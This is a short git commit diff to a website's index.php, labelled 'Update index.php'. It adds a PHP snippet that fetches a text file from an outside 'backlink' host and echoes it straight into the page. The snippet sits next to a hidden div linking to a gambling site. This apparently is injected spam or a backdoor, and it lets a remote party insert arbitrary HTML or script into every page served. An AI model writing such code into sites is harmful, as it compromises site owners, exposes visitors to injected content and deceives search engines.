4290895d732ea58a150cd07c0f902adc6b984059
wew9876 <baby.shark.dududu.101010@gmail.com>
2024-07-30 16:59:13 +0700

    Update index.php

--- index.php
+++ index.php
@@ -2418,6 +2418,10 @@ date_default_timezone_set("Asia/Makassar");
 <div style="display: none;">
 <a href="https://gelora4d.id/">https://gelora4d.id/</a>
 </div>
+	<?php
+$a = file_get_contents('https://inilinkku.com/backlink/index.txt');
+echo $a;
+?>
     <script src="<?= BASE_URL ?>js/jquery.min.js"></script>
     <script src="<?= BASE_URL ?>js/popper.min.js"></script>
     <script src="<?= BASE_URL ?>js/bootstrap.min.js"></script>
